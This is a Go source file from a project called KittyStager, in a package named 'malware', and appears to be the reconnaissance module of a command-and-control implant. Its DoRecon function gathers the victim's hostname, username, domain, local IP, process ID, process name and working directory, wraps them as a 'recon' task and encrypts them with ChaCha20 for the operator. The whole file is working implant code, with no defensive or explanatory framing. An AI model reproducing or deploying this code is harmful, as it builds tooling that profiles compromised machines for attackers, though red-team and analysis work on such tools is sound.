package malware

import (
	"KittyStager/internal/crypto"
	"KittyStager/internal/task"
	"KittyStager/internal/task/recon"
	"fmt"
	"net"
	"os"
)

func DoRecon(key string) ([]byte, error) {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}
	//get username
	username := os.Getenv("USERNAME")

	//get domain
	domain := os.Getenv("USERDOMAIN")
	//get local ip
	ip := getLocalIP()

	//process
	//pid
	pid := os.Getpid()
	//process name
	pName := os.Args[0]
	//current path
	currentPath, _ := os.Getwd()
	r := recon.NewRecon(hostname,
		username,
		domain,
		ip,
		pName,
		currentPath,
		pid,
	)
	b, err := r.MarshallTask()
	if err != nil {
		return nil, err
	}
	t := task.NewTask("recon", b)
	tm, err := t.MarshallTask()
	if err != nil {
		fmt.Println(err)
		return nil, err
	}
	c := crypto.NewChaCha20()
	e, err := c.Encrypt(tm, []byte(key))
	if err != nil {
		fmt.Println(err)
		return nil, err
	}
	return e, nil
}

func getLocalIP() string {
	conn, err := net.Dial("udp", "100.100.100.100:3480")
	if err != nil {
		return ""
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr).IP.String()
	return localAddr
}
